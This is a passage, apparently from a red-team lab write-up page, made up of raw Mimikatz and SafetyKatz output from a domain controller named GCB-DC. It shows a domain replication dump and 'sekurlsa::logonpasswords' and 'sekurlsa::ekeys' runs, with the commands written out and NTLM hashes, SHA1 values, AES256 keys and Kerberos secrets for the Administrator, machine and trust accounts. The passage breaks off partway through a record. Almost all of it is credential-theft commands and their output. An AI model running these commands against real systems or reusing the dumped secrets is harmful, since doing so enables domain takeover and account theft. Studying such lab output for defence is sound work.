+a97d7523f4ffea7310d416cef7ebf192960de81a9f302613f54ee355be700204
+7b8330efa3994c2d1240379e81157a5c3751643a06b2c834cb845ffb19ed00f9
+f9fa0814c099d89bd9d95f0f45b075e4f26def6b464f1f535d9ca27f7553fea6
+0a014df7e0282f263eea24f6a46d3b9480186490f5dc8860c6e48c7136f61b67
+32c21efa580daaae7b6dffbced0b320464d6caf2c0a256c0ba0f99a05c14b855
+</code></pre>
+
+
+Object RDN           : BCKUPKEY_P Secret
+
+Link to key with GUID: {593b18e9-2888-497e-8fc9-37557875847f} (not an object GUID)
+
+Object RDN           : BCKUPKEY_8370cd29-af7b-497d-8c49-185490269b2d Secret
+
+  * RSA key
+        |Provider name : Microsoft Strong Cryptographic Provider
+        |Unique name   :
+        |Implementation: CRYPT_IMPL_SOFTWARE ;
+        Algorithm      : CALG_RSA_KEYX
+        Key size       : 2048 (0x00000800)
+        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+        Exportable key : YES
+
+Object RDN           : BCKUPKEY_PREFERRED Secret
+
+Link to key with GUID: {8370cd29-af7b-497d-8c49-185490269b2d} (not an object GUID)
+
+Object RDN           : {31B2F340-016D-11D2-945F-00C04FB984F9}
+
+
+Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+
+
+Object RDN           : it
+
+
+Object RDN           : Server
+
+
+Object RDN           : Windows Virtual Machine
+
+
+Object RDN           : wsusadmin
+
+** SAM ACCOUNT **
+
+SAM Username         : wsusadmin
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-1105
+Object Relative ID   : 1105
+
+Credentials:
+  Hash NTLM: fb0e3e067fd4fccfd0038125b7b46306
+
+Object RDN           : RID Manager$
+
+
+Object RDN           : RID Set
+
+
+Object RDN           : GCB-DC
+
+** SAM ACCOUNT **
+
+SAM Username         : GCB-DC$
+User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-1000
+Object Relative ID   : 1000
+
+Credentials:
+  Hash NTLM: 62117bcbfd74006c9c5070162d7d177e
+
+Object RDN           : GCB-WSUS
+
+** SAM ACCOUNT **
+
+SAM Username         : GCB-WSUS$
+User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-1103
+Object Relative ID   : 1103
+
+Credentials:
+  Hash NTLM: e0495ab8e77580009fd7fbb45606170c
+
+Object RDN           : it.gcb.local
+
+
+Object RDN           : IT$
+
+** SAM ACCOUNT **
+
+SAM Username         : IT$
+User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-1104
+Object Relative ID   : 1104
+
+Credentials:
+  Hash NTLM: d6b3347efe27e1fb9a54d8f178c74b9a
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: f1498c1d1a036c796d0093b2eeae02e2
+</code></pre></div></details></li></ul></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>logon::passwords</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-PowerShell">mimikatz(commandline) # sekurlsa::logonpasswords /patch
+
+Authentication Id : 0 ; 402261267 (00000000:17fa0513)
+Session           : Interactive from 0
+User Name         : administrator
+Domain            : GCB
+Logon Server      : GCB-DC
+Logon Time        : 5/27/2025 11:30:02 AM
+SID               : S-1-5-21-2781415573-3701854478-2406986946-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : GCB
+         * NTLM     : f1498c1d1a036c796d0093b2eeae02e2
+         * SHA1     : 80fd3f4ef0eb32714ebf8afc4a43c22ce63e2bdd
+         * DPAPI    : 34c00bb0bf6325e74c778c7c8001455b
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : administrator
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 660515 (00000000:000a1423)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 31251 (00000000:00007a13)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 701409 (00000000:000ab3e1)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : GCB
+Logon Server      : GCB-DC
+Logon Time        : 2/15/2024 4:02:07 AM
+SID               : S-1-5-21-2781415573-3701854478-2406986946-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : GCB
+         * NTLM     : f1498c1d1a036c796d0093b2eeae02e2
+         * SHA1     : 80fd3f4ef0eb32714ebf8afc4a43c22ce63e2bdd
+         * DPAPI    : 34c00bb0bf6325e74c778c7c8001455b
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 31432 (00000000:00007ac8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 31316 (00000000:00007a54)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 27487 (00000000:00006b5f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:15 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : GCB-DC$
+Domain            : GCB
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:15 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : gcb-dc$
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 658047 (00000000:000a0a7f)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 49387 (00000000:0000c0eb)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:21 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 49335 (00000000:0000c0b7)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:21 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : GCB-DC$
+Domain            : GCB
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : gcb-dc$
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 31433 (00000000:00007ac9)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:20 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 660773 (00000000:000a1525)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 658096 (00000000:000a0ab0)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * NTLM     : 62117bcbfd74006c9c5070162d7d177e
+         * SHA1     : 2092bdc226a4ef4a8563125c2c97f153ac03f00e
+         * DPAPI    : 2092bdc226a4ef4a8563125c2c97f153
+        tspkg :
+        wdigest :
+         * Username : GCB-DC$
+         * Domain   : GCB
+         * Password : (null)
+        kerberos :
+         * Username : GCB-DC$
+         * Domain   : gcb.local
+         * Password : 20 78 0c 92 9c 4e c6 d2 e5 e5 7f 10 56 d2 ab 3c 37 96 7e 9b d5 80 76 38 3f 7c 44 e4 fd 90 01 0c ca 1f 66 68 b4 c3 b0 79 27 21 9e b0 80 9c f3 b9 4e b9 af 7f c1 04 8a e8 f0 8d 1b fe a9 b2 10 7d 5a ce 5c 0e 7a 13 40 fb 64 16 0f 26 48 29 11 61 fa 5e ff ae 67 1b 72 eb ed 50 c4 a6 de c6 62 aa 77 21 7d a4 0f 68 6f 47 83 a6 1c e8 b6 95 d2 75 f6 3b 32 b0 76 ad c2 ed f6 2f c6 19 e5 a0 fc d2 9c 01 77 f9 70 22 6f 21 ff 5c 23 88 eb 9b f8 39 c6 e4 97 93 67 4f 0e db 16 7a c9 70 6b 51 23 49 b0 b5 30 52 36 8c c6 22 03 2f a2 44 90 cb f8 42 35 94 79 1e 8b f5 28 d3 e3 d2 c9 2d cd 4e fb e5 86 d0 3b 63 4a 68 99 38 c7 03 80 f7 0d 0b c9 b9 9f aa 36 eb d5 80 18 bd 4b cf 97 34 a6 31 f4 59 8a 94 c2 ba 01 ed 97 5e 56 4a 33 c4 aa d1 3c 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2/15/2024 3:53:22 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit</code></pre></div></details></li></ul></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>sekurlsa::ekeys</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-PowerShell">.\SafetyKatz.exe "privilege::debug" "sekurlsa::ekeys /patch" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::ekeys /patch
+
+Authentication Id : 0 ; 402261267 (00000000:17fa0513)
+Session           : Interactive from 0
+User Name         : administrator
+Domain            : GCB
+Logon Server      : GCB-DC
+Logon Time        : 5/27/2025 11:30:02 AM
+SID               : S-1-5-21-2781415573-3701854478-2406986946-500
+
+         * Username : administrator
+         * Domain   : GCB.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       f6274b069182356199da391d6ea6a5db5b36398adbd0c93636833bab6fd58f30
+           rc4_hmac_nt       f1498c1d1a036c796d0093b2eeae02e2
+           rc4_hmac_old      f1498c1d1a036c796d0093b2eeae02e2
+           rc4_md4           f1498c1d1a036c796d0093b2eeae02e2
+           rc4_hmac_nt_exp   f1498c1d1a036c796d0093b2eeae02e2
+           rc4_hmac_old_exp  f1498c1d1a036c796d0093b2eeae02e2
+
+Authentication Id : 0 ; 660515 (00000000:000a1423)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/15/2024 4:01:53 AM
+SID               : S-1-5-90-0-2
+
+         * Username : GCB-DC$
+         * Domain   : gcb.local
